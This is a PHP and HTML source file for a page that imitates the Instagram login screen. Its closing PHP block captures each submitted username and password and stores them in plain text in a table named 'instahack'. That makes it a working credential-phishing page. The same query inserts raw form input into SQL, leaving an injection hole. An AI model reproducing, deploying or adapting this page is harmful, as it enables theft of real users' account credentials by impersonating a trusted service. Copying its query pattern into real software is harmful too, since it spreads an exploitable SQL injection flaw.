<?php 
	require "connect.php";
?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<link rel="stylesheet" type="text/css" href="style.css">
	<link rel="stylesheet" type="text/css" href="media_style.css">
	<title>Instagram</title>
	<style type="text/css">
		.forgot_password{
			text-align: center;	
		}
		.line{
			display: none;
		}
		.option_box{
			display: none;
		}
		.forgot_password a{
			text-decoration: none;
			color: rgb(0, 53, 105);
			font-family: verdana;
		}
		.title_first{
			padding: 20px;
		}
		.list{
			background-color: rgba(249, 246, 246, 1);
			float: left;
			overflow: hidden;
			margin-top: 2%;
		}
		.list_link{
		    color: rgb(0, 53, 105);
			padding: 20px;
			display: block;
			text-decoration: none;
			font-family: verdana;
		}
		.list{
			float: left;
		}
		.list_link:hover{
			color: black;
		}
		.box::-webkit-input-placeholder{
			font-family: verdana;
			font-size: 13px;
		}
		
	</style>
</head>
<body>
	<div class="option_box" id="show">
		<select class="select_list">
			<option class="option">English (United states)</option>
			<option class="option">Chinese</option>
			<option class="option">Arabic</option>
			<option class="option">Russian</option>
			<option class="option">Portuguese</option>
			<option class="option">Japanese</option>
		</select>		
	</div>
	<div class="main">
		<form action="#" method="post">
			<table align="center">
				<tr>
					<td class="title_first">Instagram</td>
				</tr>
				<tr>
					<td>
						<input type="text" name="username" placeholder="Phone number, username or email" class="box" required>
					</td>
				</tr>
				<tr>
					<td>
						<input type="password" name="password" placeholder="Password" class="box" required>
					</td>
				</tr>
				<tr>
					<td>
						<button type="submit" name="submit" class="submit_button" style="color: white;" href="final.php">Log in</button>
					</td>
				</tr>
				<tr>
					<td>
						<p class="forgot_password"><a href="#">Forgot password?</a></p>
					</td>
				</tr>
			</table>
		</form>
	</div>
	<div >
		<table class="second_main">
			<tr>
				<td>
					<p style="text-align: center; font-family: verdana">Don't have an account?<span><a href="#" id="sign_up"> Sign up</a></span></p>
				</td>
			</tr>
		</table>
	</div>
	<div>
		<table class="app">
			<tr>
				<td>
					<p class="remove" style="margin-left: 150px;">Get the app.</p>
				</td>
			</tr>
		</table>
	</div>
	<div>
		<table class="third_div remove">
			<tr>
				<td>
					<a href="#">
						<img src="App store.png" height="40" width="136">
					</a>
				</td>
				<td>
					<a href="#">
						<img src="Google play.png" height="40" width="136">
					</a>
				</td>
				<td>
					<a href="#">
						<img src="Microsoft.png" height="40" width="136">
					</a>
				</td>
			</tr>
		</table>
	</div>
	<div class="line" id="layan">
		<table>
			<tr>
				<hr class="liti">
				<p class="company">Instagram from Facebook</p>
			</tr>
		</table>
	</div>
	<footer>
		<div class="footer">
			<ul class="list">
				<li class="list"><a href="#" class="list_link">About us</a></li>
				<li class="list"><a href="#" class="list_link">Support</a></li>
				<li class="list"><a href="#" class="list_link">Blog</a></li>
				<li class="list"><a href="#" class="list_link">WordPress</a></li>
				<li class="list"><a href="#" class="list_link">API</a></li>
				<li class="list"><a href="#" class="list_link">Jobs</a></li>
				<li class="list"><a href="#" class="list_link">Privacy</a></li>
				<li class="list"><a href="#" class="list_link">Terms</a></li>
				<li class="list"><a href="#" class="list_link">Directory</a></li>
				<li class="list"><a href="#" class="list_link">Language</a></li>
			</ul>
		</div>
	</footer>
</body>
</html>

<?php

    $username = $password = "";

	if(isset($_POST['submit']))
	{
		$username =  $_POST['username'];
		$password = $_POST['password'];

		$insert_query = "INSERT INTO instahack(username, pwd) VALUES ('$username', '$password')";

		$run = $connection->query($insert_query);
	}
?>